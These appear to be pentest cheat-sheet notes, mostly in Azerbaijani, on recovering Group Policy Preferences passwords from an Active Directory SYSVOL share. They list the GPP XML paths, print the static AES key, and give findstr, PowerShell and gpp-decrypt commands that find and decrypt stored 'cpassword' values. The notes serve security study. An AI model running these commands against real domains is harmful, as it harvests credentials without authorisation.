# SYSVOL Qovluğu
```
C:\Windows\SYSVOL
\\Domain_Name\SYSVOL
```

# GPP ( Group Policy Preferences )
```
1. Groups.xml (Local Users and Groups)
...\<GPO_GUID>\Machine\Preferences\Groups\Groups.xml
cpassword --> ASE256 ( Static Key )

Static Key: 4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8 f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b

2. ScheduledTasks.xml (Planlaşdırılmış Tapşırıqlar)
...\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml

3. Services.xml (Sistem Servisləri)
...\Machine\Preferences\Services\Services.xml

4. DataSources.xml (ODBC Bağlantıları)
...\Machine\Preferences\DataSources\DataSources.xml

findstr /s /i "cpassword" \\<DomainController>\SYSVOL\*.xml
Get-ChildItem -Path "\\$env:USERDNSDOMAIN\SYSVOL" -Recurse -Filter *.xml | Select-String "cpassword"

gpp-decrypt "AES256_CYPHERTEXT"
```

# GPO ( Group Policy Object )
```
(objectClass=grouppolicyContainer)

displayName          | "GPO-nun insan tərəfindən oxuna bilən adı (məs: ""Default Domain Policy"")."
gPCFileSysPath       | GPO-nun fayl sistemindəki (SYSVOL) yolu.
whenCreated          | Siyasətin yaradılma tarixi.
versionNumber        | GPO-nun cari versiyası.
```

